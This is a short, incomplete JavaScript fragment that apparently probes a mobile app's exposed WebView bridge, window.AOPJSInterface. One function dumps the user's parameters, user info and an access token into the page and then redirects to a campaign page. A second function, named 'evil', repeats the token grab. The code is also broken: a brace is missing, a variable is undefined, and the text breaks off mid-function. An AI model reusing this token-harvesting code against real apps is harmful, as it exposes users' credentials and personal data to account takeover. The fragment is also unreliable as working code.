    function gotowhite() {       
        console.log('gotowhite');        
        (async () => {
            let params = window.AOPJSInterface.getParams();
            let userInfo = await window.AOPJSInterface.getUserInfo();
            let spToken = await window.AOPJSInterface.getSpToken('H5-Camp');
            let res1 = 'get params : \n'.concat(params).concat('\n');
            let res2 = res1.concat('get userInfo : \n'.concat(userInfo)).concat('\n');
            let res3 = res2.concat('get sptoken : \n'.concat(spToken));
            document.write(res3)
            console.log(res3);     
        })() 
        top.location.href = "https://ug-drcn.media.dbankcloud.cn/nsp-campaign-res-drcn/campaignpreview/bad5fd85661b4ce697cc0520211a44b2/index.html";

    async function evil() {
        console.log('evil');        
        (async () => {
            let params = window.AOPJSInterface.getParams();
            let userInfo = await window.AOPJSInterface.getUserInfo();
            let spToken = await window.AOPJSInterface.getSpToken('H5-Camp');

            let res2 = res1.concat('get userInfo : \n'.concat(userInfo)).concat('\n');
            let res3 = res2.concat('get sptoken : \n'.concat(spToken));

            console.log(res3);
